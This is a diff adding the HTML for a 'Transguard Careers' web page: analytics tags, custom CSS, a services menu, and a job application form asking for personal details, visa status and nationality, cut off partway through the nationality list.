+    <script type="rocketlazyloadscript" async src="https://www.googletagmanager.com/gtag/js?id=AW-640670461"></script>
+    <script type="rocketlazyloadscript"> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'AW-640670461'); </script>
+
+    <!--scripts for storing localstorage for careers thankyou-->
+    <script type="rocketlazyloadscript" async>
+      document.addEventListener( 'wpcf7mailsent', function( event ){
+        if(event.detail.contactFormId == '2329'){
+         localStorage.setItem("careerthankyou", "true");
+       }
+     });
+   </script>
+   <link rel="preload" as="font" href="wp-content/themes/transguard/dist/assets/fonts/emirates_sb-webfont.woff2" crossorigin>
+   
+   <meta name="generator" content="Elementor 3.11.2; settings: css_print_method-external, google_font-enabled, font_display-auto">
+   <style type="text/css">
+    .recentcomments a {
+      display: inline !important;
+      padding: 0 !important;
+      margin: 0 !important;
+    }
+  </style>
+  <link rel="icon" href="images/logo.jpeg" sizes="32x32" />
+  <style type="text/css" id="wp-custom-css">
+    /*remove update*/
+    .carousel-caption {
+      font-size: 14px;
+    }
+
+    .cash_btns .csr_btns img {
+      height: 40px;
+    }
+
+    .tg-section-container {
+      overflow-y: hidden !important;
+    }
+
+    .ava_height_auto .slimScrollDiv {
+      height: 50px !important;
+    }
+
+    .ava_height_auto .tg-container-scroll {
+      height: 50px !important;
+    }
+
+    .ava_height_auto .slimScrollBar {
+      display: none !important;
+    }
+
+    /*event security*/
+    .ava_height_auto_event .slimScrollDiv {
+      height: 20px !important;
+    }
+
+    .ava_height_auto_event .tg-container-scroll {
+      height: 20px !important;
+    }
+
+    .elementor-widget:not(:last-child) {
+      margin-bottom: 0px !important;
+    }
+
+    input.wpcf7-submit {
+      width: initial;
+    }
+
+    .tg-news-slider .carousel-inner .carousel-item img.w-100 {
+      height: 280px;
+    }
+
+    .elementor-widget-transguard-elementor-tg-services-tab .csr_btns {
+      margin-bottom: 30px;
+    }
+
+    .elementor-widget-transguard-elementor-tg-services-tab .csr_btns:hover {
+      color: initial;
+    }
+
+    .elementor-widget-transguard-elementor-tg-services-tab svg.replaced-sub-svg {
+      margin-bottom: 5px !important;
+    }
+
+    /*responsiveness*/
+    @media screen and (max-width: 768px) {
+      .careers_banner_tg.elementor-section.elementor-section-height-full {
+        height: 100vh !important;
+      }
+
+      .careers_banner_tg.elementor-section.elementor-section-height-full>.elementor-container {
+        height: 100% !important;
+      }
+
+      .careers_banner_tg .elementor-column.elementor-col-100,
+      .elementor-column[data-col="100"] {
+        width: 100%;
+      }
+    }
+
+    @media screen and (max-width: 991px) {
+      .tg-news-container {
+        max-width: initial;
+        width: 100%;
+      }
+
+      .myCarousel .carousel-caption .caption-desc-tg {
+        color: #fff !important;
+      }
+    }
+
+    @media screen and (max-width: 767px) {
+      .adding_overlay {
+        background-image: none !important;
+      }
+
+      .overlay_space {
+        display: none !important;
+      }
+
+      .tg_section_mobile {
+        margin: 0 !important;
+      }
+
+      .tg_section_mobile .elementor-widget-container {
+        margin: 0 !important;
+      }
+
+      .new_ser {
+        padding-bottom: 3rem !important;
+        padding-top: 3rem !important;
+      }
+
+      .mb-gray-bg .bg-white-tg {
+        background: #f0f0f0 !important;
+      }
+
+      .video_column .elementor-element-populated {
+        padding: 15px !important;
+      }
+    }
+
+    .tabs li:nth-child(9n) {
+      border-left: 1px solid #f0f0f0;
+    }
+
+    .tabs li:nth-child(10n) {
+      border-left: none;
+    }
+
+    .carousel-caption .text {
+      padding-top: 3em !important;
+    }
+
+    @media only screen and (min-width: 992px) {
+      .dropdown-content {
+        min-width: 200px;
+      }
+    }
+
+    main.content {
+      overflow-x: hidden;
+    }
+
+    /* footer widget3 title */
+    .footer-widget-3 h3 {
+      display: none !important;
+    }
+
+    @media (min-width: 576px) {
+      .footer-widget-3 h3 {
+        display: block !important;
+      }
+    }
+
+    /*  */
+    .select-dropdown select {
+      width: 100% !important;
+      position: relative;
+      z-index: 2;
+    }
+
+    /*additional css - 27-12-2020*/
+    @media screen and (max-width: 767px) {
+      ul.sub-menu.dropdown-content.drop-tg {
+        background-color: #f0f0f0;
+      }
+
+      .dropdown-content li.has-submenu ul {
+        background-color: #f7f7f7;
+      }
+    }
+
+    span.tick-mark {
+      position: relative;
+      margin-left: 15px;
+    }
+
+    span.tick-mark:before {
+      content: '✔';
+      color: #e01f25;
+      font-size: 1.2em;
+      background: 0 0;
+      position: absolute;
+      left: -20px;
+      top: -4px;
+    }
+
+    /*career responsiveness*/
+    @media screen and (max-width: 767px) {
+      .career_column1 .elementor-element-populated {
+        padding: 15px !important;
+        margin-bottom: 50px;
+      }
+    }
+
+    /*11-12-2021*/
+    input[type="radio"] {
+      width: 13px;
+      height: 13px;
+    }
+
+    @media screen and (max-width: 500px) {
+      .navbar-brand img {
+        height: 80px;
+      }
+    }
+
+    @media screen and (max-width: 768px) {
+      .thankuintrest_banner_tg {
+        padding-top: 40%;
+        padding-bottom: 3rem;
+      }
+
+      .thankuintrets_title {
+        margin-bottom: 20px;
+      }
+
+      h5 {
+        text-align: center;
+      }
+
+      .thankuintrest_subtitile h5 {
+        text-align: center;
+      }
+
+      .thankuintrest_form {
+        margin: 0 auto;
+        width: 100% !important;
+        max-width: 100% !important;
+      }
+
+      .thankuintrest_br {
+        display: none;
+      }
+
+      .elementor-3025 .elementor-element.elementor-element-6030687f {
+        padding-top: 22%;
+      }
+
+      .hidden-xs {
+        display: none;
+      }
+    }
+
+    /*styles on 23-05-2021*/
+    @media screen and (max-width: 567px) {
+      .career_column2 .elementor-column-wrap {
+        width: 95%;
+      }
+
+      .elementor-3025 .elementor-element.elementor-element-6030687f {
+        padding-top: 32%;
+      }
+
+      .hidden-xs {
+        display: none;
+      }
+    }
+
+    input[type=date]:required:invalid::-webkit-datetime-edit {
+      color: transparent;
+    }
+
+    input[type=date]:focus::-webkit-datetime-edit {
+      color: black !important;
+    }
+
+    .elementor-image-box-title {
+      font-family: emirates_sbemirates_sb !important
+    }
+
+    .doc_box {
+      -webkit-box-shadow: 0px 40px 140px 0px rgb(171 181 189 / 40%);
+      box-shadow: 0px 40px 140px 0px rgb(171 181 189 / 40%);
+      -moz-box-shadow: 0px 40px 140px 0px rgb(171 181 189 / 40%);
+      -o-box-shadow: 0px 40px 140px 0px rgb(171 181 189 / 40%);
+      border-radius: 5px;
+    }
+
+    .file_required_label {
+      top: -30px;
+      font-size: 18px;
+      color: #333;
+    }
+
+    .inpa24 {
+      padding-top: 24px
+    }
+
+    .inpa19 {
+      padding-top: 19px
+    }
+
+    .select-dropdown select {
+      font-weight: 400;
+    }
+
+    .mb-5-rem {
+      margin-bottom: 5rem !important;
+    }
+
+    .mb-1-rem {
+      margin-bottom: 1rem !important;
+    }
+
+    .mb-2-rem {
+      margin-bottom: 2rem !important;
+    }
+
+    /*checkbox*/
+    .wpcf7-checkbox label {
+      position: initial !important;
+      top: initial !important;
+      left: inline !important;
+    }
+
+    .wpcf7-checkbox input {
+      width: initial;
+      display: inline-block
+    }
+
+    .checkbox_label_tg {
+      position: initial !important;
+      margin-bottom: 20px;
+    }
+
+    .i_understand_div .wpcf7-list-item {
+      margin-left: 0;
+    }
+
+    ul.tick-list.terms_ul {
+      padding-left: 10px;
+    }
+
+    .tg-team-section .tg-team-image-span:nth-child(3) {
+      clear: both;
+    }
+
+    .codedropz-upload-inner h3 {
+      font-size: 20px;
+    }
+
+    @media screen and (max-width: 767px) {
+      .codedropz-upload-inner h3 {
+        font-size: 18px;
+      }
+    }
+
+    /**new form designs**/
+    .internal-vacancies-form input:not(input[type=radio], input[type=checkbox], input[type=file], input[type=submit]) {
+      display: block;
+      width: 100%;
+      border-radius: 0;
+      height: 47px;
+      padding: 0 15px;
+      color: #000;
+      font-size: 13px;
+      border: none;
+      background: #f7f7f7;
+      /* 	border: 1px solid #e6e6e6; */
+    }
+
+    .internal-vacancies-form input::focus {
+      border: 1px solid #e6e6e6 !important;
+    }
+
+    .internal-vacancies-form select {
+      display: block;
+      width: 100%;
+      border-radius: 0;
+      height: 47px;
+      padding: 0 15px;
+      color: #000;
+      font-size: 13px;
+      border: none;
+      background: #f7f7f7;
+    }
+
+    .internal-vacancies-form select:focus {
+      border: 1px solid #e6e6e6;
+    }
+
+    .internal-vacancies-form input[type=file] {
+      display: block;
+      width: 100%;
+      border-radius: 0;
+      height: 56px;
+      padding: 15px 15px;
+      color: #000;
+      font-size: 13px;
+      border: none;
+      background: #f7f7f7;
+    }
+
+    .internal-vacancies-form input[type=file]:focus {
+      border: 1px solid #e6e6e6;
+    }
+
+    .internal-vacancies-form textarea {
+      display: block;
+      width: 100%;
+      border-radius: 0;
+      height: auto;
+      padding: 10px 15px;
+      color: #000;
+      font-size: 13px;
+      border: none;
+      background: #f7f7f7;
+    }
+
+    .internal-vacancies-form textarea::focus {
+      border: 1px solid #e6e6e6 !important;
+    }
+
+    .internal-vacancies-form textarea::visited {
+      border: 1px solid #e6e6e6 !important;
+    }
+
+    .internal-vacancies-form textarea::active {
+      border: 1px solid #e6e6e6 !important;
+    }
+
+    .internal-vacancies-form input::-webkit-input-placeholder {
+      font-size: 12px;
+      color: #808080;
+    }
+
+    .internal-vacancies-form input::-moz-placeholder {
+      font-size: 12px;
+      color: #808080;
+    }
+
+    .internal-vacancies-form input:-ms-input-placeholder {
+      font-size: 12px;
+      color: #808080;
+    }
+
+    .internal-vacancies-form input:-moz-placeholder {
+      font-size: 12px;
+      color: #808080;
+    }
+
+    .internal-vacancies-form textarea::-webkit-input-placeholder {
+      font-size: 12px;
+      color: #808080;
+    }
+
+    .internal-vacancies-form textarea::-moz-placeholder {
+      font-size: 12px;
+      color: #808080;
+    }
+
+    .internal-vacancies-form textarea:-ms-input-placeholder {
+      font-size: 12px;
+      color: #808080;
+    }
+
+    .internal-vacancies-form textarea:-moz-placeholder {
+      font-size: 12px;
+      color: #808080;
+    }
+
+    .internal-vacancies-form label {
+      position: initial;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .internal-vacancies-form .radio {
+      display: flex;
+    }
+
+    .internal-vacancies-form .radio input {
+      display: inline-block;
+    }
+
+    .internal-vacancies-form .wpcf7-not-valid-tip {
+      font-size: 12px;
+    }
+
+    .wpcf7-not-valid-tip {
+      font-size: 12px;
+    }
+
+    .internal-vacancies-form .col-md-6,
+    .internal-vacancies-form .col-md-12 {
+      margin-bottom: 25px;
+    }
+
+    .internal-vacancies-form div[data-class=wpcf7cf_group] {
+      width: 100%;
+    }
+
+    .mb-4 {
+      margin-bottom: 4rem;
+    }
+
+    .small-text {
+      font-size: 10px;
+    }
+
+    .upload_cv_label {
+      margin-top: -40px;
+    }
+
+    .tg-upload-cv-container {
+      margin-top: 15px;
+    }
+
+    .page-id-495 [data-class="wpcf7cf_group"] {
+      width: 100%;
+      margin-bottom: 1.5rem;
+    }
+
+    .tg-security-available-downloads section {
+      padding-bottom: 120px !important;
+    }
+
+    .intl-tel-input ul.country-list {
+      z-index: 9;
+    }
+
+    .elementor-column-gap-default>.elementor-row>.elementor-column>.elementor-element-populated>.elementor-widget-wrap {
+      padding: 0;
+    }
+  </style>
+  <style id="kirki-inline-styles">
+    .navbar-nav:before {
+      background: #fff;
+    }
+
+    .navbar-expand-lg .navbar-nav .nav-link:hover {
+      color: #e01f25;
+    }
+
+    .navbar-expand-lg .navbar-nav .dropdown-content li a:hover {
+      color: #e01f25;
+    }
+
+    .navbar-nav li.active .nav-link {
+      color: #e01f25;
+    }
+
+    .navbar-nav li>a:after,
+    .navbar-nav li.active>a:after {
+      background-color: #e01f25;
+    }
+
+    footer.bg-gray-tg {
+      background: #f0f0f0;
+    }
+
+    footer.bg-gray-tg a {
+      color: #333;
+    }
+
+    footer.bg-gray-tg a:hover {
+      color: #e01f25;
+    }
+
+    #tg-copyright {
+      font-weight: 400;
+    }
+
+    ul.social {
+      background: #e01f25;
+    }
+
+    ul.social li a:hover {
+      background: #333;
+    }
+
+    #tg-search-subtitle {
+      font-weight: 400;
+    }
+
+    .search_faq .btn {
+      background: #d20a11;
+    }
+
+    .search_faq .btn {
+      background: #d20a11;
+    }
+
+    .navbar-brand img{
+    height: 108px;
+    border-radius: 49px;
+    padding: 10px;
+    margin-top: -4px;
+  }
+    .navbar-brand{
+          width: 108px;
+    height: 108px;
+    background: #fff;
+    border-radius: 50%;
+    }
+    .cards .card{
+      margin-bottom: 20px;
+      height: 315px;
+    }
+    .cards .card img{
+      width: 100%;
+      height: 170px;
+    }
+    #slider_trans .d-none.d-lg-block{
+      height: 490px;
+      object-fit: cover;
+    }
+  </style>
+</head>
+
+<body data-rsssl=1 class="home page-template-default page page-id-7 wp-custom-logo elementor-default elementor-kit-9 elementor-page elementor-page-7">
+
+  <header class="header">
+    <div class="container">
+      <div class="row">
+        <div class="col-md-12">
+          <nav class="navbar navbar-expand-lg">
+            <a class="navbar-brand" href="index">
+              <img src="images/logo.jpeg" class="custom-logo">
+
+            </a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+              <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarSupportedContent">
+              <ul class="navbar-nav ml-auto">
+                <li id="menu-item-869" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-7 current_page_item menu-item-869 nav-item  active"><a href="index" aria-current="page" class="nav-link ">Home</a></li>
+                <li id="menu-item-870" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-870 nav-item "><a href="about-us" class="nav-link ">About Us</a></li>
+                <li id="menu-item-871" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-871 nav-item "><a href="#" class="nav-link">Services <i class="fa-solid fa-angle-down float-right float-md-none"></i></a>
+                  <ul class="sub-menu dropdown-content drop-tg">
+                    <li id="menu-item-873" class="menu-item menu-item-type-post_type menu-item-object-transguard_services menu-item-873 nav-item "><a href="cash-services" class="nav-link ">Cash Services</a></li>
+                    <li id="menu-item-874" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-874 nav-item "><a href="#" class="nav-link w-100">Security Services <i class="fa-solid fa-angle-right float-right pt-md-1"></i></a>
+                      <ul class="sub-menu dropdown-content drop-tg">
+                        <li id="menu-item-1295" class="menu-item menu-item-type-post_type menu-item-object-transguard_services menu-item-1295 nav-item "><a href="security-solutions" class="nav-link ">Security Solutions</a></li>
+                        <li id="menu-item-875" class="menu-item menu-item-type-post_type menu-item-object-transguard_services menu-item-875 nav-item "><a href="event-security-services" class="nav-link ">Event Security Services</a></li>
+                        <li id="menu-item-876" class="menu-item menu-item-type-post_type menu-item-object-transguard_services menu-item-876 nav-item "><a href="executive-protection" class="nav-link ">Executive Protection</a></li>
+                        <li id="menu-item-877" class="menu-item menu-item-type-post_type menu-item-object-transguard_services menu-item-877 nav-item "><a href="system-integrations" class="nav-link ">Systems Integration</a></li>
+                      </ul>
+                    </li>
+                    <li id="menu-item-5413" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-5413 nav-item "><a href="#" class="nav-link w-100">Manpower Services <i class="fa-solid fa-angle-right float-right pt-md-1"></i></a>
+                      <ul class="sub-menu dropdown-content drop-tg">
+                        <li id="menu-item-879" class="menu-item menu-item-type-post_type menu-item-object-transguard_services menu-item-879 nav-item "><a href="manpower-solutions" class="nav-link ">Manpower Solutions</a></li>
+                        <li id="menu-item-884" class="menu-item menu-item-type-post_type menu-item-object-transguard_services menu-item-884 nav-item "><a href="hospitality-solutions" class="nav-link ">Hospitality Solutions</a></li>
+                      </ul>
+                    </li>
+                    <li id="menu-item-880" class="menu-item menu-item-type-post_type menu-item-object-transguard_services menu-item-has-children menu-item-880 nav-item "><a href="hr-outsourcing" class="nav-link w-100">Workforce Solutions <i class="fa-solid fa-angle-right float-right pt-md-1"></i></a>
+                      <ul class="sub-menu dropdown-content drop-tg">
+                        <li id="menu-item-1266" class="menu-item menu-item-type-post_type menu-item-object-transguard_services menu-item-1266 nav-item "><a href="hr-outsourcing" class="nav-link ">HR Outsourcing</a></li>
+                        <li id="menu-item-881" class="menu-item menu-item-type-post_type menu-item-object-transguard_services menu-item-881 nav-item "><a href="managed-service-provider" class="nav-link ">Managed Service Provider</a></li>
+                      </ul>
+                    </li>
+                    <li id="menu-item-882" class="menu-item menu-item-type-post_type menu-item-object-transguard_services menu-item-882 nav-item "><a href="integrated-facility-services" class="nav-link ">Facilities Management</a></li>
+                    <!--<li id="menu-item-883" class="menu-item menu-item-type-post_type menu-item-object-transguard_services menu-item-883 nav-item "><a href="aviation-services" class="nav-link ">Aviation Services</a></li>-->
+                    
+                    <!--<li id="menu-item-1174" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1174 nav-item "><a rel="noopener" href="taste-of-home" class="nav-link ">Taste of Home</a></li>-->
+                    <!--<li id="menu-item-1615" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1615 nav-item "><a rel="noopener" href="transguard-living" class="nav-link ">Transguard Living</a></li>-->
+                    <!--<li id="menu-item-1616" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1616 nav-item "><a rel="noopener" href="transguard-delivery" class="nav-link ">Transguard Delivery</a></li>-->
+                    <li id="menu-item-4496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4496 nav-item "><a href="kitchen-maintenance-solutions" class="nav-link ">Kitchen Maintenance Solutions</a></li>
+                  </ul>
+                </li>
+                <li id="menu-item-887" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-887 nav-item "><a href="news" class="nav-link ">News</a></li>
+                <!--<li id="menu-item-888" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-888 nav-item "><a href="csr" class="nav-link ">CSR</a></li>-->
+                <li id="menu-item-889" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-889 nav-item "><a href="careers" class="nav-link ">Careers</a></li>
+                <li id="menu-item-890" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-890 nav-item "><a href="contact-us" class="nav-link ">Contact Us</a></li>
+                
+              </ul>
+            </div>
+          </nav>
+        </div>
+      </div>
+    </div>
+  </header>
+<link rel='stylesheet' id='elementor-post-519-css'  href='wp-content/uploads/elementor/css/post-5191559.css?ver=1677827480' type='text/css' media='all' />
+<main class="content" id="content">
+  <div data-elementor-type="wp-page" data-elementor-id="495" class="elementor elementor-495">
+    <div class="elementor-inner">
+      <div class="elementor-section-wrap">
+        <section class="elementor-section elementor-top-section elementor-element elementor-element-117baa8 elementor-section-full_width elementor-section-height-min-height careers_banner_tg elementor-section-height-default elementor-section-items-middle" data-id="117baa8" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+          <div class="elementor-container elementor-column-gap-default">
+            <div class="elementor-row">
+              <div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-81ba226" data-id="81ba226" data-element_type="column">
+                <div class="elementor-column-wrap elementor-element-populated">
+                  <div class="elementor-widget-wrap">
+                    <div class="elementor-element elementor-element-ca9b4ae elementor-widget elementor-widget-transguard-elementor-tg-heading" data-id="ca9b4ae" data-element_type="widget" data-widget_type="transguard-elementor-tg-heading.default">
+                      <div class="elementor-widget-container">
+
+                        <h2 class="tg-heading-title font-emi"><span class="primary-color">Transguard </span> Careers</h2>
+                        <style>
+                          .tg-heading-subtitle-side:after {
+                            z-index: 1;
+                          }
+                        </style>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="elementor-section elementor-top-section elementor-element elementor-element-733b7fe elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="733b7fe" data-element_type="section">
+          <div class="elementor-container elementor-column-gap-default">
+            <div class="elementor-row">
+              <div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-ae7913f career_column1" data-id="ae7913f" data-element_type="column">
+                <div class="elementor-column-wrap elementor-element-populated">
+                  <div class="elementor-widget-wrap">
+                    <div class="elementor-element elementor-element-ec541eb elementor-widget elementor-widget-transguard-elementor-tg-heading" data-id="ec541eb" data-element_type="widget" data-widget_type="transguard-elementor-tg-heading.default">
+                      <div class="elementor-widget-container">
+
+                        <h2 class="tg-heading-title font-emi">Apply <span class="primary-color">Now</span></h2>
+                        <style>
+                          .tg-heading-subtitle-side:after {
+                            z-index: 1;
+                          }
+                        </style>
+                      </div>
+                    </div>
+                    <div class="elementor-element elementor-element-5c5a2c4 elementor-widget elementor-widget-html" data-id="5c5a2c4" data-element_type="widget" data-widget_type="html.default">
+                      <div class="elementor-widget-container">
+                        <div class="">Do you currently work for Transguard? If so, <a style="color: #0645AD;" href="index.php">click here</a></div>
+                        <br>
+                      </div>
+                    </div>
+                    <div class="elementor-element elementor-element-34e0a58 elementor-widget elementor-widget-shortcode" data-id="34e0a58" data-element_type="widget" data-widget_type="shortcode.default">
+                      <div class="elementor-widget-container">
+                        <div class="elementor-shortcode">
+                          <div role="form" class="wpcf7" id="wpcf7-f4096-p495-o1" lang="en-US" dir="ltr">
+                            <div class="screen-reader-response">
+                              <p role="status" aria-live="polite" aria-atomic="true"></p>
+                              <ul></ul>
+                            </div>
+                            <form action="contact-mail.php" method="post" enctype="multipart/form-data">
+                              <div class="row">
+                                <div class="col-md-12 mb-4">
+                                  <div class="group">
+                                    <input type="text" name="applicant_name" required /> 
+                                    <span class="highlight"></span> <span class="bar"></span> <label>Name*</label>
+                                  </div>
+                                </div>
+                                <div class="col-md-6 mb-4">
+                                  <div class="group"><input type="email" name="email" required />
+                                   <span class="highlight"></span> <span class="bar"></span> <label>Email*</label>
+                                 </div>
+                               </div>
+                               <div class="col-md-6 mb-4">
+                                <div class="select-dropdown">
+                                  <select name="gender" required>
+                                    <option value="">Select Gender *</option>
+                                    <option value="Male">Male</option>
+                                    <option value="Female">Female</option>
+                                  </select>
+                                </div>
+                              </div>
+                              <div class="col-md-6 mb-4">
+                                <div class="group"><input type="number" name="age" required />
+                                  <span class="highlight"></span> <span class="bar"></span> <label>Age*</label>
+                                </div>
+                              </div>
+                              <div class="col-md-6 mb-4">
+                                <div class="group"><input type="date" name="dob" required> 
+                                  <span class="highlight"></span> <span class="bar"></span> <label>Date of Birth*</label>
+                                </div>
+                              </div>
+                              <div class="col-md-12 mb-4">
+                                <div class="">Do you currently live in the India? :<span class="wpcf7-form-control wpcf7-radio"><span class="wpcf7-list-item first">
+                                  <input type="radio" name="do_you_currently_live_in_the_India" value="Yes" /><span class="wpcf7-list-item-label">Y</span></span><span class="wpcf7-list-item last">
+                                    <input type="radio" name="do_you_currently_live_in_the_India" value="No" /><span class="wpcf7-list-item-label">N</span></span></span></div>
+                                  </div>
+                                    <div class="col-md-12 mb-5">
+                                      <div class="select-dropdown"> 
+                                        <select name="visa_status" required>
+                                          <option value="">If you are currently in the India, what is your visa status?*</option>
+                                          <option value="Visit visa">Visit visa</option>
+                                          <option value="Employment visa (cancelled)">Employment visa (cancelled)</option>
+                                          <option value="Employment visa (still valid)">Employment visa (still valid)</option>
+                                        </select></div>
+                                      </div>
+                                    <div class="col-md-6 mb-4">
+                                      <div class="select-dropdown"> 
+                                        <select name="nationality" required>
+                                          <option value="">Nationality*</option>
+                                          <option value="Aruba">Aruba</option>
+                                          <option value="Afghanistan">Afghanistan</option>
+                                          <option value="Angola">Angola</option>
+                                          <option value="Anguilla">Anguilla</option>
+                                          <option value="Åland Islands">Åland Islands</option>
+                                          <option value="Albania">Albania</option>
+                                          <option value="Andorra">Andorra</option>
+                                          <option value="United Arab Emirates">United Arab Emirates</option>
+                                          <option value="Argentina">Argentina</option>
+                                          <option value="Armenia">Armenia</option>
+                                          <option value="American Samoa">American Samoa</option>
+                                          <option value="Antarctica">Antarctica</option>
+                                          <option value="French Southern Territories">French Southern Territories</option>
+                                          <option value="Antigua and Barbuda">Antigua and Barbuda</option>
+                                          <option value="Australia">Australia</option>
+                                          <option value="Austria">Austria</option>
+                                          <option value="Azerbaijan">Azerbaijan</option>
+                                          <option value="Burundi">Burundi</option>
+                                          <option value="Belgium">Belgium</option>
+                                          <option value="Benin">Benin</option>
+                                          <option value="Bonaire, Sint Eustatius and Saba">Bonaire, Sint Eustatius and Saba</option>
+                                          <option value="Burkina Faso">Burkina Faso</option>
+                                          <option value="Bangladesh">Bangladesh</option>
+                                          <option value="Bulgaria">Bulgaria</option>
+                                          <option value="Bahrain">Bahrain</option>
+                                          <option value="Bahamas">Bahamas</option>
+                                          <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
+                                          <option value="Saint Barthélemy">Saint Barthélemy</option>
+                                          <option value="Belarus">Belarus</option>
+                                          <option value="Belize">Belize</option>
+                                          <option value="Bermuda">Bermuda</option>
+                                          <option value="Bolivia, Plurinational State of">Bolivia, Plurinational State of</option>
+                                          <option value="Brazil">Brazil</option>
+                                          <option value="Barbados">Barbados</option>
+                                          <option value="Brunei Darussalam">Brunei Darussalam</option>
+                                          <option value="Bhutan">Bhutan</option>
+                                          <option value="Bouvet Island">Bouvet Island</option>
+                                          <option value="Botswana">Botswana</option>
+                                          <option value="Central African Republic">Central African Republic</option>
+                                          <option value="Canada">Canada</option>
+                                          <option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option>
+                                          <option value="Switzerland">Switzerland</option>
+                                          <option value="Chile">Chile</option>
+                                          <option value="China">China</option>
+                                          <option value="Cameroon">Cameroon</option>
+                                          <option value="Congo, the Democratic Republic of the">Congo, the Democratic Republic of the</option>
+                                          <option value="Congo">Congo</option>
+                                          <option value="Cook Islands">Cook Islands</option>
+                                          <option value="Colombia">Colombia</option>
+                                          <option value="Comoros">Comoros</option>
+                                          <option value="Cape Verde">Cape Verde</option>
+                                          <option value="Costa Rica">Costa Rica</option>
+                                          <option value="Cuba">Cuba</option>
+                                          <option value="Curaçao">Curaçao</option>
+                                          <option value="Christmas Island">Christmas Island</option>
+                                          <option value="Cayman Islands">Cayman Islands</option>
+                                          <option value="Cyprus">Cyprus</option>
+                                          <option value="Czech Republic">Czech Republic</option>
+                                          <option value="Germany">Germany</option>
+                                          <option value="Djibouti">Djibouti</option>
+                                          <option value="Dominica">Dominica</option>
+                                          <option value="Denmark">Denmark</option>
+                                          <option value="Dominican Republic">Dominican Republic</option>
+                                          <option value="Algeria">Algeria</option>
+                                          <option value="Ecuador">Ecuador</option>
+                                          <option value="Egypt">Egypt</option>
+                                          <option value="Eritrea">Eritrea</option>
+                                          <option value="Western Sahara">Western Sahara</option>
+                                          <option value="Spain">Spain</option>
+                                          <option value="Estonia">Estonia</option>
+                                          <option value="Ethiopia">Ethiopia</option>
+                                          <option value="Finland">Finland</option>
+                                          <option value="Fiji">Fiji</option>
+                                          <option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)</option>
+                                          <option value="France">France</option>
+                                          <option value="Faroe Islands">Faroe Islands</option>
+                                          <option value="Micronesia, Federated States of">Micronesia, Federated States of</option>
+                                          <option value="Gabon">Gabon</option>
+                                          <option value="United Kingdom">United Kingdom</option>
+                                          <option value="Georgia">Georgia</option>
+                                          <option value="Guernsey">Guernsey</option>
+                                          <option value="Ghana">Ghana</option>
+                                          <option value="Gibraltar">Gibraltar</option>
+                                          <option value="Guinea">Guinea</option>
+                                          <option value="Guadeloupe">Guadeloupe</option>
+                                          <option value="Gambia">Gambia</option>
+                                          <option value="Guinea-Bissau">Guinea-Bissau</option>
+                                          <option value="Equatorial Guinea">Equatorial Guinea</option>
+                                          <option value="Greece">Greece</option>
+                                          <option value="Grenada">Grenada</option>
+                                          <option value="Greenland">Greenland</option>
+                                          <option value="Guatemala">Guatemala</option>
+                                          <option value="French Guiana">French Guiana</option>
+                                          <option value="Guam">Guam</option>
+                                          <option value="Guyana">Guyana</option>
+                                          <option value="Hong Kong">Hong Kong</option>
+                                          <option value="Heard Island and McDonald Islands">Heard Island and McDonald Islands</option>
+                                          <option value="Honduras">Honduras</option>
+                                          <option value="Croatia">Croatia</option>
+                                          <option value="Haiti">Haiti</option>
+                                          <option value="Hungary">Hungary</option>
+                                          <option value="Indonesia">Indonesia</option>
+                                          <option value="Isle of Man">Isle of Man</option>
+                                          <option value="India">India</option>
+                                          <option value="British Indian Ocean Territory">British Indian Ocean Territory</option>
+                                          <option value="Ireland">Ireland</option>
+                                          <option value="Iran, Islamic Republic of">Iran, Islamic Republic of</option>
+                                          <option value="Iraq">Iraq</option>
+                                          <option value="Iceland">Iceland</option>
+                                          <option value="Israel">Israel</option>
+                                          <option value="Italy">Italy</option>
+                                          <option value="Jamaica">Jamaica</option>
+                                          <option value="Jersey">Jersey</option>
+                                          <option value="Jordan">Jordan</option>
+                                          <option value="Japan">Japan</option>
+                                          <option value="Kazakhstan">Kazakhstan</option>
+                                          <option value="Kenya">Kenya</option>
+                                          <option value="Kyrgyzstan">Kyrgyzstan</option>
+                                          <option value="Cambodia">Cambodia</option>
+                                          <option value="Kiribati">Kiribati</option>
+                                          <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
+                                          <option value="Korea, Republic of">Korea, Republic of</option>
+                                          <option value="Kuwait">Kuwait</option>
+                                          <option value="Lao People&#039;s Democratic Republic">Lao People&#039;s Democratic Republic</option>
+                                          <option value="Lebanon">Lebanon</option>
+                                          <option value="Liberia">Liberia</option>
+                                          <option value="Libya">Libya</option>
+                                          <option value="Saint Lucia">Saint Lucia</option>
+                                          <option value="Liechtenstein">Liechtenstein</option>
+                                          <option value="Sri Lanka">Sri Lanka</option>
+                                          <option value="Lesotho">Lesotho</option>
+                                          <option value="Lithuania">Lithuania</option>
+                                          <option value="Luxembourg">Luxembourg</option>
+                                          <option value="Latvia">Latvia</option>
+                                          <option value="Macao">Macao</option>
+                                          <option value="Saint Martin (French part)">Saint Martin (French part)</option>
